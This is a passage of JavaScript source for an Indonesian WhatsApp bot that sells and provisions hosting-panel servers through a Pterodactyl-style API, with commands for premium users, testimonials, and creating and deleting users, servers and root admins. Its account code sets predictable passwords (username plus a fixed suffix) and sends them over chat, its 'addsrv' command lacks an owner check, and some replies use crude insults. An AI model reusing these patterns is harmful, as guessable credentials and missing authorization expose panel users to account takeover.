haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/44a68808942d029924e24.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await haikal.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "jadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
jadibot(haikal, sender)
}
break
case "listjadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
listjadibot(haikal, m)
}
break
case "stopjadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
stopjadibot(haikal, sender)
}
break
case 'testi1':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 1
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_1.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi2':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 2
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_2.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi3':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 3
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_3.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi4':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 4
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_4.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi5':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 5
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_5.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi6':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 6
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_6.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi7':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 7
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_7.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi8':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 8
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_8.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi9':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 9
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_9.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
case 'testi10':{
let tekssss = `*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜱᴛᴏʀᴇ ${botname}*

ɪɴɪ ᴀᴅᴀʟᴀʜ ᴛᴇꜱᴛɪᴍᴏɴɪ ᴅᴀʀɪ ꜱᴛᴏʀᴇ ᴋᴀᴍɪ

ɢᴀᴍʙᴀʀ ᴅᴀɴ ʜᴀʀɢᴀ ʙɪꜱᴀ ᴄᴇᴋ ᴅɪ ᴀᴛᴀꜱ ʏᴀ ᴋᴀᴋ

ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ʙᴀʀᴀɴɢ ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ɴᴏᴍᴇʀ ᴀᴅᴍɪɴ ᴅɪ ʙᴀᴡᴀʜ

https://wa.me/628388072690

• 𝔗𝔢𝔰𝔱𝔦𝔪𝔬𝔫𝔦 𝔨𝔢 10
© 𝔠𝔬𝔭𝔶𝔯𝔦𝔤𝔥𝔱 𝔟𝔶 𝔱𝔥𝔬𝔪𝔳𝔢𝔩𝔷
`
haikal.sendMessage(from, { image: fs.readFileSync(`./thomz/testimoni_10.jpg`),
 caption: tekssss, 
footer: `${botname} © 20223`},
{quoted: m})
}
break
       case "ramlist":

lrm = `RAM YANG TERSEDIA BY THOMZ :
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
6GB ✅
7GB ✅
8GB ✅
9GB ✅
10GB ✅
11GB ✅
12GB ✅
13GB ✅
14GB ✅
15GB ✅
16GB ✅
17GB ✅
18GB ✅
19GB ✅
20GB ✅
UNLI (KHUSUS ADMIN SERVER)

KALO MAU NAMBAH BISA LANGSUNG CHAT BANG THOMZ
BIAR DI TAMBAHIN SERVERNYA 
https://wa.me/628388072690`
haikal.sendMessage(from, {text : lrm}, {quoted : m})
break 
        case "panel": {
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*


CARA BUAT SERVER PANEL BY THOMZ :

ram user,nomer

contoh : 1gb THOMZ,628388072690

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server cuma bang thomz yang bisa.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar servernya bang thomz:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
      messageText += `BY THOMZ`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await haikal.sendMessage(m.chat, { text: messageText }, { quoted: m });
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list usernya bang thomz:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
    messageText += `BY THOMZ`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await haikal.sendMessage(m.chat, { text: messageText }, { quoted: m });
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isOwner) return reply(`KHUSUS ADMIN BANG tHOMZ`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND BANG THOMZ*')
reply('*SUCCESSFULLY DELETE THE SERVER BANG THOMZ*')
}
        break
        case "delusr": {
  if (!isOwner) return reply(`KHUSUS ADMIN BANG THOMZ`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND BANG THOMZ*')
reply('*SUCCESSFULLY DELETE THE USER BANG THOMZ*')
}
        break
                case "addusr": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Bang Thomz Seorang`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await haikal.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

  INFO USER
*⥁**ID* : ${user.id}
*⥁**USERNAME* : ${user.username}
*⥁**EMAIL* : ${user.email}
*⥁**NAME* : ${user.first_name} ${user.last_name}
*⥁**CREATED AT* :  ${tanggal}
*⥁**PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
haikal.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
  INFO USER
*⥁**EMAIL* : ${email}
*⥁**USERNAME* : ${username}
*⥁**PASSWORD* : ${password.toString()}
*⥁**LOGIN* : ${domain}
*⥁**INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*⥁**TUTOR* : https://youtu.be/kBOs62HLMzU
`,
})
}
break
                case "createadmin": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Bang Thomz!*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "thomzganteng"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@thomzkc.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

*⥁*ID: ${user.id}
*⥁*USERNAME: ${user.username}
*⥁*EMAIL: ${user.email}
*⥁*NAME: ${user.first_name} ${user.last_name}
*⥁*LANGUAGE: ${user.language}
*⥁*ADMIN: ${user.root_admin}
*⥁*CREATED AT: ${user.created_at}
*⥁*LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await haikal.sendMessage(m.chat, listMessage)

    await haikal.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

*⥁*USERNAME :  ${username}
*⥁*PASSWORD : ${password}
*⥁*LOGIN : ${domain}
*⥁**INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*⥁**TUTOR* : https://youtu.be/kBOs62HLMzU

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin BY Thomz:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`
      messageText += `BY THOMZ`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await haikal.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

*⥁*ID: ${server.id}
*⥁*UUID: ${server.uuid}
*⥁*NAME: ${server.name}
*⥁*DESCRIPTION: ${server.description}
*⥁*MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
*⥁*DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
*⥁*CPU: ${server.limits.cpu}%
*⥁*CREATED AT: ${server.created_at}`)
}
        break
case "1gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1gb"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY THOMZ PANEL

 *DONE CRATE USER + SERVER ID :* ${user.id}
JANGAN LUPA DI PAKE YAH ASU
KALO NGGA NANTI DI HAPUS BANG THOMZ`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}
 *INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE : BOT HANYA MENGIRIM DATA 1 KALI
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© BY THOMZ
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
